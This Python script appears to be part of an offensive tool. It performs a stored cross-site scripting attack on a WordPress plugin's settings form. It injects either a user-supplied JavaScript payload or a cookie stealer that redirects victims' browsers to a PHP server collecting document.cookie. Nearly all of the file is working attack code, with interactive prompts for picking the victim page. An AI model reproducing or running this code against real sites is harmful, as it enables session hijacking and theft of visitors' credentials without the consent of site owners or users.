
import requests
import subprocess
import shutil

processList = []

def attack(url):
    global processList
    attackChoice(url)


def attackChoice(url):
    print("This is an XSS attack, you are going to store some javascript on all the pages of the victim")
    print("1: Specify a custom payload to be stored ")
    print("2: Steal victim's cookies")
    result = False;
    choice = input("\n Choose the operation to perform : ")
    while (not (choice=="1" or choice=="2")):
        choice = input("\n You have chosen an invalid option, choose 1 or 2 : ")
    if (choice=="1"):
        result = loadCustomPayload(url)
    elif (choice=="2"):
        retry = True
        while (retry==True):
            if (phpServerSetup(url)):
                retry = False  # exit from while loop, no retry needed.
                print("The malicious request has been performed")
            else:
                yesno = input("Impossible to perform the request, retry the procedure? Y/n ? : ")
                if (yesno != "Y"): #exit from the while looop, stop retrying.
                    retry = False


def loadCustomPayload(url):
    payload = input("insert your payload in javascript code : ")
    page = input("insert the page to be added in the URL , example: /ciao-mondo/ : ")
    confirm = input ("Do you want to load payload on : "+url+page +"  ?    Y/n ?")

    while (not (confirm ==  "Y" or confirm == "n")):
        confirm = input("Insert Y or n")

    while (confirm == "n"):
        page = input("insert the page to attack or '?' to exit : ")
        if(page=='?'):
            return False
        confirm = input("Do you want to load payload on : " + url + page + "  ?    Y/n ?")

    if confirm == "Y":
        response = sendRequest(url + page, payload)
        if (not response.status_code == 404):
            print("Successfull payload upload")
            return True
        else:
            print("Error, page not found")
            return False

def loadCookieStealerPayload(url,serverpath):
    attack_script = '<script type="text/javascript">' \
                    'var loc = \''+serverpath+'?cookies=\';' \
                    'loc = loc.concat(document.cookie);' \
                    'document.location=loc;' \
                    '</script>'
    print("attack payload: "+attack_script)
    page = input("insert the page to be added in the URL , example: /ciao-mondo/ : ")
    confirm = input("Do you want to load payload on : " + url + page + "  ?    Y/n ?")
    while (confirm == "n"):
        page = input("insert the page to attack or '?' to exit : ")
        if(page=='?'):
            return False
        confirm = input("Do you want to load payload on : " + url + page + "  ?    Y/n ?")

    if confirm == "Y":
        response = sendRequest(url+page,attack_script)
        if (not(response.status_code==400 or response.status_code==404 or response.status_code==302)):
            print("Payload loaded successfully")
            return True
        else:
            print("Unable to reach the wordpress page")
            return False

def phpServerSetup(url):
    print("To run the cookie stealer you should have installed php 5.4 or more recent version")
    phpPath = input("Plese insert the ABSOLUTE path to the PHP folder")
    filePath = input("Please insert the ABSOLUTE path where you would like to store the cookies and the php cookie stealer")
    if (phpServerStart(phpPath,filePath)):
        print("PHP Server started successfully")
        shutil.copy("resources/cookieStealer.php",filePath)
        print("PHP cookies stealer script loaded into "+ filePath)
        serverPath = "http://127.0.0.1"+"/cookieStealer.php"
        print("server Path : " +serverPath)
        return loadCookieStealerPayload(url,serverPath)
    else:
        print("PHP Server start error")
        print("Do you have php installed? \n Did you gave the right php path?")
        print("Any other resources running on 127.0.0.1:80? ")
        return False



def phpServerStart(phpPath, filePath):
    call = "php -S 127.0.0.1:80 -t "+filePath
    print(call)
    phpProcess = subprocess.Popen(call,stdout=subprocess.PIPE,cwd=phpPath,shell=True)
    processList.append(phpProcess)

    poll = phpProcess.poll() # check if it is still running
    if (poll==None):
        print("PHP console is running")
        return True
    else:
        output, error = phpProcess.communicate()
        print(output +" |||| "+ error)
        print("Process return code: " + string(phpProcess.returncode))
        return False



def sendRequest(url,script):
    headers = {'content-type':'application/x-www-form-urlencoded','host':'localhost'}
    attack_script = script
    raw_data = 'sgcgoogleanalytic=' + attack_script + '&sgcwebtools=&button=Save+Changes&action=savegooglecode'
    response = requests.post(url, headers=headers, data=raw_data)
    return response